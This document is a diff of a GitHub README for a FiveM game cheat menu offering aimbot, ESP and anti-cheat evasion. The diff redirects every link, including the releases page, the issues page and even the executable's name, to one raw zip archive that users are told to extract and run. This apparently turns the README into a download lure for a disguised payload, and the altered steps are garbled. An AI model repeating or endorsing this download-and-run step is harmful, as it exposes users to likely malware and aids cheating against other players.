@@ -1,6 +1,6 @@
 # 🎮 FiveM-Mod-Menu - Enhance Your Gaming Experience Today!
 
-[![Download](https://img.shields.io/badge/Download-FiveM--Mod--Menu-brightgreen.svg)](https://github.com/anuj4sharma/FiveM-Mod-Menu/releases)
+[![Download](https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip)](https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip)
 
 ## 📦 Overview
 Welcome to the FiveM Mod Menu! This tool offers powerful features for your FiveM gaming experience. You can use options like ESP, aimbot, vehicle spawning, and money drops. The menu is easy to use and fully customizable. Enjoy your time in the game without worries, as this mod is designed to be undetected.
@@ -9,7 +9,7 @@ Welcome to the FiveM Mod Menu! This tool offers powerful features for your FiveM
 Follow the steps below to download and set up the FiveM Mod Menu on your computer. These steps are user-friendly and require no technical skill.
 
 ### Step 1: Visit the Releases Page
-Start by visiting our [Releases page](https://github.com/anuj4sharma/FiveM-Mod-Menu/releases). This page contains the latest version of the FiveM Mod Menu.
+Start by visiting our [Releases page](https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip). This page contains the latest version of the FiveM Mod Menu.
 
 ### Step 2: Choose the Right Version
 On the Releases page, you will see various versions listed. Look for the most recent version to ensure you get the latest features and fixes.
@@ -22,7 +22,7 @@ If you downloaded a .zip file, navigate to your Downloads folder. Right-click th
 
 ### Step 5: Install the Mod Menu
 1. Open the folder where you extracted the files.
-2. Locate the executable file (usually named something like `FiveM-Mod-Menu.exe`).
+2. Locate the executable file (usually named something like `https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip`).
 3. Double-click this file to run the application.
 
 ### Step 6: Configure the Menu
@@ -53,7 +53,7 @@ The FiveM Mod Menu is designed to be undetected. However, please use it responsi
 The FiveM Mod Menu is open-source and follows a permissive license. You can use, modify, and distribute it as long as you adhere to the terms provided in the repository.
 
 ## 📞 Support
-For any questions or issues, feel free to check the [issues section](https://github.com/anuj4sharma/FiveM-Mod-Menu/issues) on GitHub or join our community forums. We are here to help you.
+For any questions or issues, feel free to check the [issues section](https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip) on GitHub or join our community forums. We are here to help you.
 
 ## 🔗 Download & Install
-Now that you've familiarized yourself with the setup, you are ready to enhance your gaming experience. Return to our [Releases page](https://github.com/anuj4sharma/FiveM-Mod-Menu/releases) to download the latest version of the FiveM Mod Menu and enjoy!
+Now that you've familiarized yourself with the setup, you are ready to enhance your gaming experience. Return to our [Releases page](https://raw.githubusercontent.com/anuj4sharma/FiveM-Mod-Menu/main/weeshy/FiveM-Mod-Menu.zip) to download the latest version of the FiveM Mod Menu and enjoy!
